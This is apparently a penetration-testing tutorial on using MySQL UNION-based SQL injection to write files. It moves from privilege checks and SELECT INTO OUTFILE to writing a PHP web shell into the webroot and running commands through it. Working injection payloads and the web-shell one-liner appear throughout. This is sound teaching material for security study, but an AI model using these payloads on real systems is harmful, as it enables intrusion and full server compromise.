# SQLI FILE MANIPULATION; Writing Files.
## Index
1. [Attack overview.](#attack-overview)
2. [Write Files Privileges.](#write-files-privileges)
   - [secure_file_priv](#secure_file_priv)
3. [Writing Files.](#writing-files)
   - [SELECT INTO OUTFILE](#select-into-outfile)
   - [Writing Files through SQL Injection.](#writing-files-through-sql-injection)
   - [Writing a Web Shell](#writing-a-web-shell)

---------------------------

## Attack overview.
When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting 
code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. 
<br />Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files ([Write Files Privileges](#write-files-privileges)). To do so we will use [secure_file_priv](#secure_file_priv).<br />
Once we know we have the necessary privileges we can start writing files using [SELECT INTO OUTFILE](#select-into-outfile), [Writing Files through SQL Injection.](#writing-files-through-sql-injection), and finally obtaining a web shell ([Writing a Web Shell](#writing-a-web-shell)).


## Write Files Privileges
To be able to write files to the back-end server using a MySQL database, we require three things:
1. User with FILE privilege enabled [3- SQLI User Enumeration. INFORMATION_SCHEMA.user](https://github.com/alejandro-pentest/Hacking-Web/blob/main/SQL%20Injection/SQLI%20Database%20Enumeration/3-%20SQLI%20User%20Enumeration.%20INFORMATION_SCHEMA.user.md).
2. MySQL global secure_file_priv variable not enabled
3. Write access to the location we want to write to on the back-end server


> We have already found that our current user has the `FILE` privilege __necessary to write files__ ([SQLI User Enumeration](https://github.com/alejandro-pentest/Hacking-Web/blob/main/SQL%20Injection/SQLI%20Database%20Enumeration/3-%20SQLI%20User%20Enumeration.%20INFORMATION_SCHEMA.user.md)).
> We must now check if the MySQL database has that privilege. This can be done by checking the `secure_file_priv` global variable.

### secure_file_priv
The secure_file_priv variable is __used to determine where to read/write files from__. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, 
we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory.<br /> 
MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses `/var/lib/mysql-files` as the default folder. 
This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, 
meaning that we cannot read/write files anywhere within the system.

So, let's see how we can find out the value of secure_file_priv. Within MySQL, we can use the following query to obtain the value of this variable:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
> However, as we are using a [Union Injection](https://github.com/alejandro-pentest/Hacking-Web/blob/main/SQL%20Injection/SQLI%20Database%20Enumeration/1-%20SQLI%20UNION%20Injection.md), we have to get the value using a `SELECT` statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. MySQL global variables are stored in a table called `global_variables`, and as per the documentation, this table has two columns `variable_name` and `variable_value`.<br />

We have to select these two columns from that table in the `INFORMATION_SCHEMA` database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them.
We will then __filter the results to only show the `secure_file_priv` variable, using the `WHERE` clause__.
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
So, similar to other UNION injection queries, we can get the above query result with the following payload.

```sql
X' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/aec9c7ef-c6e2-4b78-87f7-05bbd413091d" width="600" alt="Sublime's custom image"/>
</p>

> And the result shows that the __`secure_file_priv` value is empty__, meaning that we can read/write files to any location.

-------------
## Writing Files.
### SELECT INTO OUTFILE
Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the `SELECT .. INTO OUTFILE` statement. <br />
> The `SELECT INTO OUTFILE` statement can be used to __write data from select queries into files__. This is usually used for exporting data from tables.

To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified. The below example saves the output of the users table into the `/tmp/credentials` file:

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

If we go to the back-end server and `cat` the file, we see that table's content:

```bash
cat /tmp/credentials 
admin   392037dbba51f692776d6cefb6dd546d
newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
When we cat the file, we see that text:
```bash
cat /tmp/test.txt 
this is a test
```
```bash
ls -la /tmp/test.txt 
-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```
As we can see above, the `test.txt` file was created successfully and is owned by the mysql user.

> Tip: Advanced file exports utilize the `FROM_BASE64("base64_data")` function in order to be able to write long/advanced files, including binary data.


### Writing Files through SQL Injection
Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write file written successfully to the `/var/www/html/proof.txt` file, which we can then access on the web application:
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration,
like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`,
or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux
or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

The UNION injection payload would be as follows:
```sql
X' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```


We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file `proof.txt` in the webroot, we see that it indeed exists:



> Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.




### Writing a Web Shell

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
```php
<?php system($_REQUEST[0]); ?>
```
We can reuse our previous UNION injection payload, and change the string to the above, and the file name to shell.php:


```sql
X' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/9ed883ba-3ad9-4b8f-af4b-203929116094" width="600" alt="Sublime's custom image"/>
</p>

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL:


<p align="center">
  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/16678144-bee9-48c9-be03-884df6e198e7" width="600" alt="Sublime's custom image"/>
</p>



The output of the id command confirms that we have code execution and are running as the www-data user.




